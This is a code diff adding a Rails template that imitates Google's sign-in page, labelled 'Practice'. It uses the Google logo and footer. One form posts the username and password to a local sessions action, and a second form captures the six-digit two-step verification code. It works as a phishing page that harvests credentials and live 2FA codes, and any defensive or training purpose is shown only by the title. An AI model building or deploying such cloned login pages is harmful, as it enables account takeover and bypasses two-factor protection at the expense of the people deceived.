@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login - Practice</title>
+    <% content_for :stylesheet do %>
+        <%= stylesheet_link_tag 'google/page_google' %>
+    <% end %>
+    <% content_for :javascript do %>
+        <%= javascript_include_tag 'google/page_google' %>
+    <% end %>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Form 1: Email/Phone and Password -->
+        <form id="formulario" class="login-form active form" action="<%= url_for(controller: 'sessions', action: 'google_login') %>" method="post">
+            <%= image_tag 'google/googlelogo_color_272x92dp.png', alt: 'Google', class: 'google-logo' %>
+
+            <h1>Sign In</h1>
+            <p class="subtitle">Use your Google Account</p>
+
+            <input type="text" 
+                   id="identifier" 
+                   name="username"
+                   placeholder="Email or phone"
+                   required>
+            
+            <input type="password"
+                    id="password"
+                    name="password"
+                    placeholder="Enter your password" 
+                    required>
+
+            <div class="button-container">
+                <button type="button" class="back-button" id="createAccountBtn">Create account</button>
+                <button type="submit" class="next-button">Next</button>
+            </div>
+        </form>
+
+        <!-- Form 2: 2FA -->
+        <form id="twoFaForm" class="login-form" action="<%= url_for(controller: 'sessions', action: 'google_login') %>" method="post">
+            <%= image_tag 'google/googlelogo_color_272x92dp.png', alt: 'Google', class: 'google-logo' %>
+
+            <h1>Two-Step Verification</h1>
+            <p class="subtitle" id="verificationMethod"></p>
+
+            <input type="number"
+                   id="2faCode" 
+                   name="dfa"
+                   placeholder="6-digit code" 
+                   required>
+
+            <div class="button-container">
+                <button type="button" class="back-button" id="backBtn">Back</button>
+                <button type="submit" class="next-button">Verify</button>
+            </div>
+        </form>
+
+        <div class="footer">
+            <select>
+                <option>English (United States)</option>
+            </select>
+            <div>
+                <span>Help</span>
+                <span>Privacy</span>
+                <span>Terms</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
